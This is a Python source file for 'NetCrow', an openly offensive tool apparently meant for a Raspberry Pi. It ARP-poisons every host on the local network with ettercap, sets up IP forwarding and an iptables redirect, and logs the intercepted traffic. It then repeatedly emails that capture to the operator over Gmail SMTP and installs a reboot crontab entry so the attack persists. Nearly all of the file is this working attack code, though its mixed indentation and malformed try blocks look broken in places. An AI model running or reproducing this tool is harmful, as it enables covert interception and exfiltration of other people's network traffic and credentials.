# Imports
import os
import time
import subprocess
import smtplib
import datetime
import os.path
import sys
from email.mime.text import MIMEText


# Define Attributes

Version = "3.0"
Creator = "Raspberry"
Published = "https://github.com/Raspberryy/NetCrow"

Sender = ""
Password = ""
Reciever = ""

SaveDelay = 15			# Time Delay before Saving 
ReRun = 10			# Amount of Information Mails
InfTime = 12			# Every SaveDelay * InfTime [Sec] --> New Information Mail
				# --> NetCrow runs SaveDelay * InfTime * ReRun [Sec]
				# --> NetCrow runs by default 30min or 1800sek
FinishExecution = "reboot"	# Possible "reboot" "shutdown" "stay" - Standart "reboot"

interface = ""

nettest = 0
SendBoot = 0
BootBol = 0 
Path = os.path.dirname(os.path.abspath(__file__))




# Define Colours

pink = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yell = '\033[93m'
red = '\033[91m'
white = '\033[0m'
bold = '\033[1m'
under = '\033[4m'


# Define Interface

if interface == "":
	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
	interface_get = os.popen(interface_comm).read()
	interface = interface_get[0:4]
	if interface == "wlan":
		interface = "wlan0"


# Define Main Function

def BootingAttack():
	
	if SendBoot != 1:
		SendBootUp()
		
	try:
        	StartAttack()
	except:
        	ErrSub = "Starting the Atttack FAILED"
        try:
		ErrText = "Connection to Internet               Yes \nConnection to Network via " + interface + "\nUptime                             " + UpTimeTemp
        except:
		ErrText = "Connection to Internet               Yes \nConnection to Network             No" + "\nUptime                            " + UpTimeTemp
		SendMail(ErrSub, ErrText)


	# Preparing Reboot
	AutoEmailSend()
	SaveOldFile()
	os.system("rm "+ Path  + "/ettercap.txt")
	FinishExe()	





# Define Main-Sub-Functions

def SendBootUp():
	
	# Send Mail after Boot
	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
	Date = time.strftime("%d/%m/%Y")
	Sub = "NetCrow has started working at " + Time + " the " + Date + " !!!" 

	# Get IP Adress
	ipaddress_comm = "hostname -I"
	ipaddress_get = os.popen(ipaddress_comm).read()
	Text = "Interface	    " + interface +"\nNetwork IP	" + ipaddress_get  
	SendMail(Sub, Text)
	
	
def StartAttack():
	
	# Set up Environment
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") 
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080") 
	
	# Start Ettercap
	try:
                command = "ettercap -T -q -i " + interface + " -M arp /// /// >" + Path + "/ettercap.txt &"
                os.system(command)
        except:
                print red + "Error - Starting Ettercap failed" + white
        else:
                command = "ettercap -T -q -i " + interface + " -M arp // // >" + Path + "/ettercap.txt &"
                os.system(command)

				
				
def GetUpTime():
	UpRead = os.popen("uptime").read()
	UpTime = UpRead[12:25]
	return UpTime


def AutoEmailSend():
	
	# Loop 
	BackupsAnzahl = 0 
	TempVarInf = 0
	while BackupsAnzahl < ReRun:
		while(TempVarInf < InfTime):
			time.sleep(SaveDelay)
			TempVarInf = TempVarInf + 1
		TempVarInf = 0
		SaveOldFile()
		
		# Send Mail
		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
       		Date = time.strftime("%d/%m/%Y")
		SubjectAttackFinished = "New Informations - " + Time + " the " + Date + " !!!"
		
		# Getting and Setting Text
		ettertext = open(Path + "/ettercap.txt", 'rb')
		ettermsg = MIMEText(ettertext.read())
		ettertext.close()
		TextAttackFinished = ettermsg
		
		# Sending Email
		SendMail(SubjectAttackFinished, TextAttackFinished)
		
		BackupsAnzahl = BackupsAnzahl + 1

	


def SendMail(Subject, Text):

	# Connect to Server
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()
	server.ehlo
	server.login(Sender, Password)
	
	# Set Text and Subject
	Message = 'Subject: %s\n\n%s' % (Subject, Text)


	# Sending Email
	try:
	        server.sendmail(Sender, Reciever, Message)
	except:
		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
        	Date = time.strftime("%d/%m/%Y")
		tempcmd = "echo Email sending Fail -  " + Time + " the " + Date + " > error.log"
		os.system(tempcmd)
	server.quit()	
	
def SaveOldFile():

	SaveStat = 0 
	vartemp = 0
	while SaveStat == 0: 
		commandtempif = Path + "/Logging/ettercap" + str(vartemp)  + ".txt"
		if (os.path.isfile(commandtempif)):
                        vartemp = vartemp + 1 
		else:
			commtemp = "cp " + Path  + "/ettercap.txt " + Path  + "/Logging/ettercap" + str(vartemp)  + ".txt"
                        os.system(commtemp)
			SaveStat = 1
	return

def FinishExe():
	
	if FinishExecution == "reboot":
		os.system("reboot")
	if FinishExecution == "shutdown":
		os.system("shutdown now")
	if FinishExecution == "stay":
		print yell + "[*]" + white + "NetCrow has finished Working - Close it manually"
		print ""
		
	
# Define Sub-Functions	
	
def AutoStart():
	
	os.system("sudo crontab -l > mycron")
	CommandString = "sudo echo \'@reboot sh " + Path + "/launcher.sh > " + Path + "/Logging/cronlog 2>&1  \' >> mycron"
	os.system(CommandString)
	os.system("sudo crontab mycron")
	os.system("sudo rm mycron")
	CommandLauncher = "echo \'sleep 15 \' > launcher.sh"
        os.system(CommandLauncher)
	CommandLauncher = "echo \'sudo python " + Path + "/attack.py\' >> launcher.sh"
	os.system(CommandLauncher)

def AutoStartDis():
	
	# Warn User
	print ""
	print red + "           All Crontab Jobs are going to be deleted!!!" + white
	print ""
	print ""
	raw_input("     Press any Key to continue...")
	print ""
	
	# Delete Jobs
	os.system("crontab -r")

	# Delete Launcher.sh
	dellaun = "rm " + Path + "/launcher.sh"
	os.system(dellaun)

	
def AttackOnly():
	
	# Set up Environment
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

	# Start Ettercap
	try:
		command = "ettercap -T -q -i " + interface + " -M arp /// ///"
		os.system(command)
	except:
		print red + "Error - Starting Ettercap failed" + white
	else:
		command = "ettercap -T -q -i " + interface + " -M arp // //"
		os.system(command)	
		
def BackgroundAttack():
	
	# Set up Environment
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

	# Start Ettercap
	try:
		command = "ettercap -T -q -i " + interface + " -M arp /// /// > " + Path + "/Logging/cronlog 2>&1"
		os.system(command)
	except:
		print red + "Error - Starting Ettercap failed" + white
	else:
		command = "ettercap -T -q -i " + interface + " -M arp // // > " + Path + "/Logging/cronlog 2>&1"
		os.system(command)
	
		
def TestMail():
	SendMail("It works!", "This is a Test-Mail generated by NetCrow")	

def DeleteBackup():
	print ""
	print red + "	Clearing Backup Data" + white
	print ""
	time.sleep(2)
	clearcommand = "rm " + Path + "/Logging/ettercap*"	
	clearfile = "rm " + Path + "/ettercap.txt"
	os.system(clearcommand)
	os.system(clearfile)
	

def PrintHelp():
	print ""
	print green + under +  "		NETCROW - BY RASPBERRYY" + white	
	print ""
	print "	Command List:"
	print "	 -a             	Start Attack manually"
	print "	 -b             	Start Attack in Background"
	print "	 -d             	Delete Backups in Logging"	
	print "	 -h --help		Prints this"	
	print "	 -s            	 Prevent NetCrow Start Message"
	print "	 -t			Send Test E-Mail"
	print "	 --AutoStart-enable     Enable automatical Boot"
        print "	 --AutoStart-disable    Disable automatical Boot"
	print "	 -install 		Install NetCrow"
	print "	 -uninstall		Remove Netcrow"
	print ""


	
def Install():
	print yell + "[*]" + white + " Installing ZLib"
	os.system("sudo apt-get install zlib1g zlib1g-dev -y")
	print yell + "[*]" + white + " Installing Build-Essential"
	os.system("sudo apt-get install build-essential -y")
	print yell + "[*]" + white + " Installing Ettercap"
	os.system("sudo apt-get install ettercap -y")
	os.system("sudo apt-get update")
	os.system("sudo apt-get install ettercap-text-only -y")
		
	# Install Ip-Tables
	print yell + "[*]" + white + " Installing Ip-Tables-Dev"
	os.system("apt-get install iptables-dev")


	
def Uninstall():
	print red + "[!]" + white + " Removing ZLib"
	os.system("sudo apt-get remove zlib1g zlib1g-dev -y")
	print red + "[!]" + white + " Removing Build-Essential"
	os.system("sudo apt-get remove build-essential -y")
	print red + "[!]" + white + " Removing Ettercap"
	os.system("sudo apt-get remove ettercap -y")
	os.system("sudo apt-get remove ettercap-text-only -y")
	
	# remove Ip-Tables
	print red + "[!]" + white + " Removing IpTables-Dev"
	os.system("apt-get remove iptables-dev")


# Main Program - Test for Commands

if len(sys.argv)==1:
	sys.argv.append(" ")
if len(sys.argv)==2:
	sys.argv.append(" ")

if sys.argv[1]=="-h":
        PrintHelp()
	BootBol = 1
elif sys.argv[2]=="-h":
        PrintHelp()
	BootBol = 1
elif sys.argv[1]=="--help":
        PrintHelp()
	BootBol = 1
elif sys.argv[2]=="--help":
        PrintHelp()
	BootBol = 1

elif sys.argv[1]=="-a":
	AttackOnly()
	BootBol = 1
elif sys.argv[2]=="-a":
	AttackOnly()
	BootBol = 1

elif sys.argv[1]=="-b":
	BackgroundAttack()
	BootBol = 1
elif sys.argv[2]=="-b":
	BackgroundAttack()
	BootBol = 1
	
elif sys.argv[1]=="-s":
        SendBoot = 1
elif sys.argv[2]=="-s":
        SendBoot = 1

elif sys.argv[1]=="-t":
        TestMail()
	BootBol = 1
elif sys.argv[2]=="-t":
        TestMail()
	BootBol = 1	

elif sys.argv[1]=="--AutoStart-enable":
        AutoStart()
        BootBol = 1
elif sys.argv[2]=="--AutoStart-enable":
        AutoStart()
        BootBol = 1

elif sys.argv[1]=="--AutoStart-disable":
        AutoStartDis()
        BootBol = 1
elif sys.argv[2]=="--AutoStart-disable":
        AutoStartDis()
        BootBol = 1


elif sys.argv[1]=="-d":
        DeleteBackup()
        BootBol = 1
elif sys.argv[2]=="-d":
        DeleteBackup()
        BootBol = 1
		
elif sys.argv[1]=="-install":
        Install()
        BootBol = 1
elif sys.argv[2]=="-install":
        Install()
        BootBol = 1
		
elif sys.argv[1]=="-uninstall":
        Uninstall()
        BootBol = 1
elif sys.argv[2]=="-uninstall":
        Uninstall()
        BootBol = 1
        

		


# No Commands - Starting Normal Booting Attack

if BootBol != 1:
	BootingAttack()
